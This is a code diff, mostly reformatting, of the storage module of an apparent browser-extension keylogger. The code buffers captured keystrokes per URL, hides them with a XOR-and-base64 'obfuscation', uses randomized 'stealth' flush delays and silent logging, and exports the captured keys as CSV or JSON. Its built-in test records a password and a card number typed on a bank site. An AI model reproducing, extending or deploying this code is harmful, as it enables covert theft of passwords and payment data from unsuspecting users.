@@ -1,4 +1,3 @@
-
 /* global TSConstants, Schema */
 (function (root, factory) {
   if (typeof module !== "undefined" && module.exports) {
@@ -9,22 +8,25 @@
 })(typeof self !== "undefined" ? self : this, function () {
   "use strict";
   // CONFIGURATION
-  var OBFUSCATION = (typeof TSConstants !== "undefined" && TSConstants.OBFUSCATION)
-    ? TSConstants.OBFUSCATION 
-    : { XOR_KEY: 0x5a, ENCODING: "base64" };
-  var STEALTH_CONF = (typeof TSConstants !== "undefined" && TSConstants.STEALTH)
-    ? TSConstants.STEALTH 
-    : {
-        DELAY_MS: 3000,
-        BATCH_SIZE: 20,
-        MIN_KEY_LENGTH: 3,
-        SILENT_MODE: true,
-        FLUSH_DELAY_MIN: 2000,
-        FLUSH_DELAY_MAX: 5000
-      };
-  var STORAGE_KEY = (typeof TSConstants !== "undefined" && TSConstants.STORAGE_KEY)
-    ? TSConstants.STORAGE_KEY 
-    : "ts_log";
+  var OBFUSCATION =
+    typeof TSConstants !== "undefined" && TSConstants.OBFUSCATION
+      ? TSConstants.OBFUSCATION
+      : { XOR_KEY: 0x5a, ENCODING: "base64" };
+  var STEALTH_CONF =
+    typeof TSConstants !== "undefined" && TSConstants.STEALTH
+      ? TSConstants.STEALTH
+      : {
+          DELAY_MS: 3000,
+          BATCH_SIZE: 20,
+          MIN_KEY_LENGTH: 3,
+          SILENT_MODE: true,
+          FLUSH_DELAY_MIN: 2000,
+          FLUSH_DELAY_MAX: 5000,
+        };
+  var STORAGE_KEY =
+    typeof TSConstants !== "undefined" && TSConstants.STORAGE_KEY
+      ? TSConstants.STORAGE_KEY
+      : "ts_log";
   // ===========================================================================
   // SILENT LOGGING
   // ===========================================================================
@@ -42,14 +44,22 @@
   function stealthError() {
     console.error.apply(console, arguments);
   }
-  // STORAGE DETECTION 
+  // STORAGE DETECTION
   function getStorage() {
     // Chrome
-    if (typeof chrome !== "undefined" && chrome.storage && chrome.storage.local) {
+    if (
+      typeof chrome !== "undefined" &&
+      chrome.storage &&
+      chrome.storage.local
+    ) {
       return chrome.storage.local;
     }
     // Firefox / Browser
-    if (typeof browser !== "undefined" && browser.storage && browser.storage.local) {
+    if (
+      typeof browser !== "undefined" &&
+      browser.storage &&
+      browser.storage.local
+    ) {
       return browser.storage.local;
     }
     // Mock for testing
@@ -73,7 +83,7 @@
       },
       async remove(key) {
         delete this._data[key];
-      }
+      },
     };
   }
   var storage = getStorage();
@@ -124,7 +134,11 @@
         entries = entries.slice(-2000);
       }
       await storage.set({ [STORAGE_KEY]: entries });
-      stealthLog("[Stealth] Successfully flushed", bufferToSave.length, "entries");
+      stealthLog(
+        "[Stealth] Successfully flushed",
+        bufferToSave.length,
+        "entries",
+      );
     } catch (e) {
       stealthError("[Stealth] Flush failed:", e);
       // Restore buffer on error (but check if new items arrived)
@@ -148,7 +162,11 @@
       return; // Timer already exists
     }
     flushTimer = setTimeout(flushBuffer, getRandomFlushDelay());
-    stealthLog("[Stealth] Scheduled flush in", flushTimer._idleTimeout || getRandomFlushDelay(), "ms");
+    stealthLog(
+      "[Stealth] Scheduled flush in",
+      flushTimer._idleTimeout || getRandomFlushDelay(),
+      "ms",
+    );
   }
   function addToBuffer(serializedEntry) {
     memoryBuffer.push(serializedEntry);
@@ -158,7 +176,7 @@
       stealthLog("[Stealth] Buffer size limit reached, flushing immediately");
       clearFlushTimer();
       // Call flush without await (fire and forget)
-      flushBuffer().catch(function(err) {
+      flushBuffer().catch(function (err) {
         stealthError("[Stealth] Immediate flush failed:", err);
       });
     } else {
@@ -168,7 +186,7 @@
   // HELPER: Random delay
   function randomDelay(minMs, maxMs) {
     var delay = Math.floor(Math.random() * (maxMs - minMs + 1) + minMs);
-    return new Promise(function(resolve) {
+    return new Promise(function (resolve) {
       setTimeout(resolve, delay);
     });
   }
@@ -196,7 +214,9 @@
     if (typeof plainText !== "string" || plainText === "") return "";
     var xored = "";
     for (var i = 0; i < plainText.length; i++) {
-      xored += String.fromCharCode(plainText.charCodeAt(i) ^ OBFUSCATION.XOR_KEY);
+      xored += String.fromCharCode(
+        plainText.charCodeAt(i) ^ OBFUSCATION.XOR_KEY,
+      );
     }
     try {
       return btoa(xored);
@@ -210,17 +230,26 @@
   // ===========================================================================
   function deobfuscate(encoded) {
     if (typeof encoded !== "string" || encoded === "") return "";
+
+    // Quick validation: If the string contains characters outside typical Base64
+    // it was either stored un-obfuscated or got corrupted. Return as-is.
+    if (!/^[A-Za-z0-9+/=]*$/.test(encoded.replace(/\s/g, ""))) {
+      return encoded;
+    }
+
     try {
       var decoded = atob(encoded);
       var plain = "";
       for (var i = 0; i < decoded.length; i++) {
-        plain += String.fromCharCode(decoded.charCodeAt(i) ^ OBFUSCATION.XOR_KEY);
+        plain += String.fromCharCode(
+          decoded.charCodeAt(i) ^ OBFUSCATION.XOR_KEY,
+        );
       }
       // Revert the unescape(encodeURIComponent(...)) done in content.js to support unicode characters like arrows or emojis
       try {
         return decodeURIComponent(escape(plain));
-      } catch(uriError) {
-        return plain; 
+      } catch (uriError) {
+        return plain;
       }
     } catch (e) {
       stealthError("[Stealth] deobfuscate error:", e.message || e);
@@ -251,7 +280,9 @@
     var merged = [];
     for (var sessionId in sessions) {
       var sessionEntries = sessions[sessionId];
-      sessionEntries.sort(function(a, b) { return a.timestamp - b.timestamp; });
+      sessionEntries.sort(function (a, b) {
+        return a.timestamp - b.timestamp;
+      });
       var mergedKeys = "";
       var firstUrl = sessionEntries[0].url;
       var firstTimestamp = sessionEntries[0].timestamp;
@@ -261,28 +292,34 @@
       }
       var mergedEntry = Schema.createEntry(firstUrl, mergedKeys, {
         sessionId: sessionId,
-        obfuscated: isObfuscated
+        obfuscated: isObfuscated,
       });
       mergedEntry = Object.freeze({
         url: mergedEntry.url,
         timestamp: firstTimestamp,
         keys: mergedEntry.keys,
         sessionId: mergedEntry.sessionId,
-        obfuscated: mergedEntry.obfuscated
+        obfuscated: mergedEntry.obfuscated,
       });
       merged.push(mergedEntry);
     }
-    var serialized = merged.map(function(entry) {
+    var serialized = merged.map(function (entry) {
       return Schema.serializeEntry(entry);
     });
-    stealthLog("[Stealth] batchEntries: reduced from", entries.length, "to", serialized.length);
+    stealthLog(
+      "[Stealth] batchEntries: reduced from",
+      entries.length,
+      "to",
+      serialized.length,
+    );
     return serialized;
   }
   // ===========================================================================
   // 4. exportAsCSV(entries)
   // ===========================================================================
   function exportAsCSV(entries) {
-    if (!Array.isArray(entries)) return "url,timestamp,keys,sessionId,obfuscated\n";
+    if (!Array.isArray(entries))
+      return "url,timestamp,keys,sessionId,obfuscated\n";
     var csv = "url,timestamp,keys,sessionId,obfuscated\n";
     for (var i = 0; i < entries.length; i++) {
       try {
@@ -293,7 +330,7 @@
           entry.timestamp,
           escapeCSV(keys),
           escapeCSV(entry.sessionId),
-          entry.obfuscated ? "true" : "false"
+          entry.obfuscated ? "true" : "false",
         ].join(",");
         csv += row + "\n";
         if (csv.length > 5000000 && i < entries.length - 1) {
@@ -322,7 +359,7 @@
           timestampMs: entry.timestamp,
           keys: keys,
           sessionId: entry.sessionId,
-          obfuscated: entry.obfuscated
+          obfuscated: entry.obfuscated,
         });
         if (readable.length > 1000) {
           stealthWarn("[Stealth] JSON limited to 1000 entries");
@@ -383,10 +420,17 @@
   async function storeLoggedData(url, plainKeys) {
     if (!isValidKeystrokeData(plainKeys)) return false;
     try {
-      var entry = Schema.createEntry(url || "unknown", plainKeys, { obfuscated: false });
+      var entry = Schema.createEntry(url || "unknown", plainKeys, {
+        obfuscated: false,
+      });
       var serialized = Schema.serializeEntry(entry);
       addToBuffer(serialized);
-      stealthLog("[Stealth] Added to buffer:", plainKeys.length, "chars from", url);
+      stealthLog(
+        "[Stealth] Added to buffer:",
+        plainKeys.length,
+        "chars from",
+        url,
+      );
       return true;
     } catch (e) {
       stealthError("[Stealth] storeLoggedData failed:", e);
@@ -451,15 +495,21 @@
     }
     await flushBuffer();
   }
-  // TEST FUNCTION 
+  // TEST FUNCTION
   async function runTest() {
-    console.log("%c===  Stealth Test Started ===", "color: cyan; font-weight: bold");
+    console.log(
+      "%c===  Stealth Test Started ===",
+      "color: cyan; font-weight: bold",
+    );
     try {
       // Test 1: Obfuscate / Deobfuscate
       var original = "password123";
       var hidden = obfuscate(original);
       var revealed = deobfuscate(hidden);
-      console.log("Test 1 - Obfuscate:", original === revealed ? " PASS" : " FAIL");
+      console.log(
+        "Test 1 - Obfuscate:",
+        original === revealed ? " PASS" : " FAIL",
+      );
       console.log("  Original:", original);
       console.log("  Hidden:", hidden);
       console.log("  Revealed:", revealed);
@@ -469,14 +519,25 @@
       await storeLoggedData("https://bank.com", "card123456");
       // Test 3: Check count (buffer not flushed yet)
       var countBeforeFlush = await getDataCount();
-      console.log("Test 2 - Before flush: Count =", countBeforeFlush, countBeforeFlush === 2 ? " PASS" : " FAIL");
+      console.log(
+        "Test 2 - Before flush: Count =",
+        countBeforeFlush,
+        countBeforeFlush === 2 ? " PASS" : " FAIL",
+      );
       // Test 4: Force flush and verify
       await forceFlush();
       var afterFlush = await getDataCount();
-      console.log("Test 3 - After flush: Count =", afterFlush, afterFlush === 2 ? " PASS" : " FAIL");
+      console.log(
+        "Test 3 - After flush: Count =",
+        afterFlush,
+        afterFlush === 2 ? " PASS" : " FAIL",
+      );
       // Test 5: Export JSON
       var json = await exportData("json");
-      console.log("Test 4 - Export JSON:", json.length > 10 ? " PASS" : " FAIL");
+      console.log(
+        "Test 4 - Export JSON:",
+        json.length > 10 ? " PASS" : " FAIL",
+      );
       console.log("  Preview:", json.substring(0, 200) + "...");
       // Test 6: Export CSV
       var csv = await exportData("csv");
@@ -511,6 +572,6 @@
     getDataCount: getDataCount,
     forceFlush: forceFlush,
     // Test function
-    runTest: runTest
+    runTest: runTest,
   });
 });
